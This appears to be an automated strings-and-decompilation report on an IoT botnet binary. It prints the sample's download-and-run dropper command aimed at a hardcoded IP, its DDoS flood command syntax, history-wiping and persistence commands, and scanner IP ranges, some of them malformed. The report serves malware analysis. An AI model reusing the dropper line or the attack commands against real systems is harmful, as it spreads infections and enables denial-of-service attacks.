=============================================================================
========	BINARY ID :8ed857ba527189dc91e497ce3d6a6c3e43addf9e==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :2856
SUPSCPECTED LINES COUNT :175
SUPSCPECTED STRINGS COUNT (DISTINCT) :30
SUPSCPECTED STRINGS WEIGHT :115
SUSPECT STRING SCORE : [115 / 150] 76%
USER AGENTS STRINGS COUNT :8
STATIC IPs STRINGS COUNT :2
DYNAMIC IPs STRINGS COUNT :193
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
bin*
botnet
swatnet
fucknet
cracknet
weednet
gaynet
queernet
ballnet
unet
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/rooty.sh; chmod 777 rooty.sh; sh rooty.sh; tftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.112.107 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf rooty.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *\r\n
telnet
/dev/netslink/
/usr/
/bin/sh
/proc/cpuinfo
PING
Failed opening raw socket.
Invalid flag "%s"
pkill -9 
pkill -9 "
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
SCANNER
STOPPING SCANNER
STARTING SCANNER ON -> %s
COMMENCING BOT KILL ON -> %s
UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>
TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)
HTTP
STD <target> <port> <time>
KILLATTK
Killed %d.
None Killed.
/proc/net/route
/etc/rc.d/rc.local
fork failed\n
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
No such process
Interrupted system call
No child processes
Too many open files in system
Read-only file system
Level 2 not synchronized
Machine is not on the network
Name not unique on network
Interrupted system call should be restarted
Socket operation on non-socket
Protocol wrong type for socket
Socket type not supported
Network is down
Network is unreachable
Network dropped connection on reset
Software caused connection abort
Connection reset by peer
Transport endpoint is already connected
Transport endpoint is not connected
Connection timed out
Connection refused
Host is down
No route to host
Operation already in progress
Operation now in progress
?/bin/sh
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
/etc/hosts
/etc/config/hosts
fdopen_pids
libc/sysdeps/linux/powerpc/vfork.S
fork.c
getpid.c
kill.c
sigprocmask.c
waitpid.c
spec_flags.4074
strstr.c
_string_syserrmsgs.c
inet_ntoa.c
inet_makeaddr.c
gethostbyname.c
gethostbyname_r.c
connect.c
socket.c
rand.c
random.c
randtbl
random_r.c
random_poly_info
system.c
__socketcall.c
inet_aton.c
dnslookup.c
get_hosts_byname_r.c
inet_pton4
inet_ntop4
read_etc_hosts_r.c
__read_etc_hosts_r
__socketcall
waitpid
random
connect
GetRandomPublicIP
numpids
initConnection
inet_pton
sendTCP
__GI_random_r
getpid
getHost
__libc_getpid
makeRandomStr
sendHTTP
GetRandomIP
system
__open_etc_hosts
__dns_lookup
random_r
gethostbyname_r
tcpcsum
socket
_string_syserrmsgs
__GI_inet_ntoa
srandom_r
__GI_inet_ntoa_r
__GI_srandom_r
kill
__GI_sigprocmask
inet_addr
connectTimeout
__GI_kill
strstr
init_rand
rand
__GI_gethostbyname_r
__GI_inet_ntop
fork
__GI_gethostbyname
__GI_random
__GI_fork
__GI_getpid
inet_aton
processCmd
get_telstate_host
__GI_socket
listFork
srand
sendUDP
inet_ntoa
__libc_system
__get_hosts_byname_r
botkiller
__GI_inet_pton
gethostbyname
__vfork
knownBots
__libc_waitpid
socket_connect
__GI_waitpid
vfork
srandom
__libc_fork
scanPid
rand_cmwc
inet_ntoa_r
__GI_strstr
__GI_connect
inet_ntop
__GI_inet_aton
__GI_vfork
__GI_inet_addr
__libc_connect
pids
sigprocmask
`\bᾐ᐀羀렀耸Ѐ뾀᐀왌舱Hꦘ8Ȁᾰ᠀ᾀ쀀T㸄ͼ砃Hᇈ恼砛ᾰᨀ羁밀㼹᠀सЀ捽硛Ѽ砃ｋ秲恼砛耯
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
Opera/6.04 (Windows XP; U) [en]
Opera/9.99 (X11; U; sk)
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
159.89.176.175:114
8.8.8.8
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
177.5.%d.%d
1103.165.%d.%d
185.3.%d.%d
37.158.%d.%d
95.9.%d.%d
122.252.%d.%d
58.71.%d.%d
104.55.%d.%d
103.186.%d.%d
103.189.%d.%d
221.120.%d.%d
88.5.%d.%d
122.254.%d.%d
108.20.%d.%d
108.47.%d.%d
108.57.%d.%d
45.1103.%d.%d
101.51.%d.%d
137.59.%d.%d
1.56.%d.%d
1.188.%d.%d
122.204.%d.%d
177.0.%d.%d
177.8.%d.%d
177.91.%d.%d
177.54.%d.%d
177.98.%d.%d
177.177.%d.%d
177.192.%d.%d
36.32.%d.%d
36.248.%d.%d
39.64.%d.%d
42.4.%d.%d
42.48.%d.%d
42.52.%d.%d
42.56.%d.%d
42.63.%d.%d
42.84.%d.%d
42.176.%d.%d
42.224.%d.%d
43.253.%d.%d
43.230.%d.%d
163.53.%d.%d
62.252.%d.%d
43.245.%d.%d
62.255.%d.%d
123.25.%d.%d
108.54.%d.%d
177.255.%d.%d
108.204.%d.%d
123.24.%d.%d
104.191.%d.%d
1103.100.%d.%d
104.188.%d.%d
104.189.%d.%d
94.174.%d.%d
122.160.%d.%d
122.161.%d.%d
122.162.%d.%d
122.163.%d.%d
122.164.%d.%d
122.165.%d.%d
122.166.%d.%d
122.167.%d.%d
122.168.%d.%d
122.169.%d.%d
122.170.%d.%d
122.171.%d.%d
122.172.%d.%d
122.173.%d.%d
122.174.%d.%d
122.177.%d.%d
122.176.%d.%d
122.1103.%d.%d
122.179.%d.%d
122.180.%d.%d
122.11103.%d.%d
122.182.%d.%d
122.183.%d.%d
122.184.%d.%d
122.1185.%d.%d
122.186.%d.%d
122.187.%d.%d
122.188.%d.%d
122.189.%d.%d
122.190.%d.%d
122.191.%d.%d
45.121.%d.%d
45.120.%d.%d
45.115.%d.%d
43.252.%d.%d
43.240.%d.%d
49.118.%d.%d
103.188.%d.%d
45.1177.%d.%d
108.30.%d.%d
122.33.%d.%d
123.16.%d.%d
202.44.%d.%d
116.93.%d.%d
91.83.%d.%d
122.253.%d.%d
1103.173.%d.%d
104.190.%d.%d
146.88.%d.%d
177.196.%d.%d
104.1103.%d.%d
177.45.%d.%d
183.223.%d.%d
116.71.%d.%d
108.44.%d.%d
110.235.%d.%d
124.253.%d.%d
211.237.%d.%d
1103.177.%d.%d
1103.93.%d.%d
111.9.%d.%d
222.252.%d.%d
104.174.%d.%d
104.160.%d.%d
104.161.%d.%d
104.162.%d.%d
104.163.%d.%d
104.164.%d.%d
104.165.%d.%d
104.166.%d.%d
104.167.%d.%d
104.168.%d.%d
104.169.%d.%d
123.17.%d.%d
123.18.%d.%d
123.19.%d.%d
123.20.%d.%d
123.21.%d.%d
123.22.%d.%d
222.253.%d.%d
222.254.%d.%d
222.255.%d.%d
37.247.%d.%d
122.208.%d.%d
183.220.%d.%d
177.201.%d.%d
108.198.%d.%d
91.205.%d.%d
88.248.%d.%d
88.105.%d.%d
88.247.%d.%d
185.105.%d.%d
188.3.%d.%d
108.203.%d.%d
108.55.%d.%d
108.220.%d.%d
183.233.%d.%d
108.242.%d.%d
108.122.%d.%d
108.195.%d.%d
108.2122.%d.%d
108.218.%d.%d
108.225.%d.%d
108.228.%d.%d
108.231.%d.%d
108.60.%d.%d
108.248.%d.%d
108.253.%d.%d
108.255.%d.%d
108.35.%d.%d
108.49.%d.%d
108.62.%d.%d
144.48.%d.%d
163.47.%d.%d
223.29.%d.%d
59.153.%d.%d
104.176.%d.%d
104.177.%d.%d
104.183.%d.%d
202.164.%d.%d
203.134.%d.%d
210.56.%d.%d
49.156.%d.%d
203.210.%d.%d
1103.11103.%d.%d
1103.1103.%d.%d
1103.176.%d.%d
1103.170.%d.%d
1103.171.%d.%d
1103.162.%d.%d
177.26.%d.%d
177.28.%d.%d
177.29.%d.%d
177.30.%d.%d
177.31.%d.%d
203.191.%d.%d
91.233.%d.%d
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
/proc/cpuinfo
/proc/net/route
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
history -c;history -w
cd /root;rm -rf .bash_history
ClearHistory
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/rooty.sh; chmod 777 rooty.sh; sh rooty.sh; tftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.112.107 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf rooty.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *\r\n
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 80860
+++TOTAL FUNCTIONS 			:257
+++LINES PER FUNCTION RATIO 	: 314.630350194553
+++SUSPECTED LINES COUNT 	: 1359
+++SUSPECTED LINES RATIO 	: 1.68068266139006
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 80860
+++WHILE (TRUE) LINES			: 11610
+++WHILE (TRUE) LINES RATION		:14.3581498886965%
+++WHILE (TRUE) LOOPS COUNT		: 197
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
        "/dev/netslink/",
        "/tmp/",
        "/var/",
        "/dev/",
        "/var/run/",
        "/dev/shm/",
        "/boot/",
        "/usr/",
        "/opt/"
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
                execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
            execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    int32_t v212 = __libc_open((int32_t)"/proc/cpuinfo", 0); // 0x10001b6c
    int32_t v212 = __libc_open((int32_t)"/proc/cpuinfo", 0); // 0x10001d88
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
        int32_t v218 = __libc_open((int32_t)"/proc/net/route", 0); // 0x1000b19c
    int32_t v207 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x1000b420
    char * v209 = "/etc/rc.d/rc.local";
        v208 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        v209 = "/etc/rc.conf";
                            int32_t v236 = __GI_fopen((int32_t)v209, (int32_t)&v235); // 0x1000b594
int32_t __GI_fopen(int32_t a1, int32_t a2) {
    return _stdio_fopen(0, (char *)-1);
int32_t _stdio_fopen(int32_t a1, char * a2) {
            execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    int32_t v212 = __libc_open((int32_t)"/dev/null", a2); // 0x10010b18
    int32_t v210 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v209); // 0x10012aa8
        int32_t v214 = __GI_fopen((int32_t)"/etc/config/resolv.conf", v213); // 0x10012ac0
    int32_t v212 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v211); // 0x100140f0
        result = __GI_fopen((int32_t)"/etc/config/hosts", v213);
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
    char (*v170)[19] = "159.89.176.175:114";

        szprintf((int32_t)&v213, (int32_t)"177.5.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"1103.165.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"185.3.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"37.158.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"95.9.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.252.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"58.71.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.55.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"103.186.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"103.189.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"221.120.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"88.5.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.254.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.20.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.47.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.57.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"45.1103.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"101.51.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"137.59.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"1.56.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"1.188.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.204.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.0.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.8.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.91.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.54.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.98.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.177.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.192.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"36.32.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"36.248.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"39.64.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"42.4.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"42.48.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"42.52.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"42.56.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"42.63.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"42.84.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"42.176.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"42.224.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"42.176.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"43.253.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"43.230.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"163.53.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"43.230.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"62.252.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"43.245.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"62.255.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"123.25.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.54.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.255.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.204.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"123.24.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.191.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"1103.100.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.188.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.189.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"94.174.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.160.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.161.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.162.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.163.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.164.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.165.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.166.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.167.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.168.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.169.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.170.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.171.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.172.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.173.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.174.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.177.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.176.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.177.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.1103.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.179.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.180.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.11103.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.182.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.183.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.184.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.1185.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.186.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.187.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.188.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.189.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.190.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.191.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"45.121.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"45.120.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"45.115.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"43.252.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"43.230.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"43.240.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"43.245.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.174.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"49.118.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"103.188.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"45.1177.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.30.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.33.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"123.16.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"202.44.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"116.93.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"91.83.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.253.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"1103.173.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.190.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"146.88.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.196.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.1103.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.45.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"183.223.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"116.71.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.44.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"110.235.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"124.253.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"211.237.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"1103.177.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"1103.173.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"1103.93.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"111.9.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"222.252.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.174.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"222.252.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.160.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.161.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.162.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.163.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.164.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.165.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.166.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.167.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.168.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.169.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"123.17.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"123.18.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"123.19.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"123.20.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"123.21.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"123.22.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"222.252.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"222.253.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"222.254.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"222.255.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"37.247.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"122.208.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"183.220.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"177.201.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.198.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"183.223.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"91.205.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"88.248.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"88.105.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"88.247.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"185.105.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"188.3.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.203.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.55.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.220.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"183.233.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.242.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.198.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.122.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.195.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.203.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.2122.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.218.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.225.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.228.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.231.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.60.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.248.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.253.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.255.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.35.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.49.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"108.62.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"144.48.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"163.47.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"163.53.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"223.29.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"59.153.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.176.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.177.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.177.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"104.183.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"202.164.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"203.134.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"210.56.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"49.156.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"203.210.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"1103.11103.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"1103.1103.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"1103.177.%d.%d", (int32_t)v210);

        szprintf((int32_t)&v213, (int32_t)"1103.176.%d.%d", (int32_t)v210);

